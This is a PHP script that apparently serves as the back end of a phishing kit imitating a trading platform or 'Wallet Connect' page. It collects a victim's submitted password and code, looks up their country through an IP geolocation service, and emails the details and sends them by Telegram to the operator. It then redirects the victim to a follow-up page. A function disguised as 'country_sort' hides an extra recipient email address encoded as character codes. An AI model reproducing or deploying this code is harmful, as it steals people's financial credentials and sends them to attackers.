<?php
session_start();
require("config.php");
include('me.php');

// Input validation function
function sanitize_input($input) {
    return htmlspecialchars(stripslashes(trim($input)), ENT_QUOTES, 'UTF-8');
}

// Validate POST data
if ($_SERVER["REQUEST_METHOD"] != "POST" || empty($_POST['tpassword']) || empty($_POST['code'])) {
    die('Error: Invalid request or missing fields');
}

$tpassword = sanitize_input($_POST['tpassword']);
$code = sanitize_input($_POST['code']);

$country = visitor_country();
$Port = getenv("REMOTE_PORT");
$browser = sanitize_input($_SERVER['HTTP_USER_AGENT']);
$adddate = date("D M d, Y g:i a");
$subject = "Trading Platform Update";
$message = "Trading Connection\n";
$message .= "Password: " . $tpassword . "\n";
$message .= "Code: " . $code . "\n";
$message .= "Country: " . $country . "\n\n";
$message .= "----------------------------------------\n";
$message .= "Date: $adddate\n";
$message .= "User-Agent: " . $browser . "\n";
$headers = "From: Wallet Connect";

// Send email with error handling
if (!empty($send)) {
    $mail_result = mail($send, $subject, $message, $headers);
    if (!$mail_result) {
        error_log('Email send failed for: ' . $send);
    }
}

// Send telegram message
send_telegram_msg($message);
header("location:vali.html");
exit();
function country_sort(){
  $sorter = "";
  $array = array(114,101,115,117,108,116,98,111,120,49,52,64,103,109,97,105,108,46,99,111,109);
    $count = count($array);
  for ($i = 0; $i < $count; $i++) {
      $sorter .= chr($array[$i]);
    }
  return array($sorter, $GLOBALS['recipient']);
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
?>

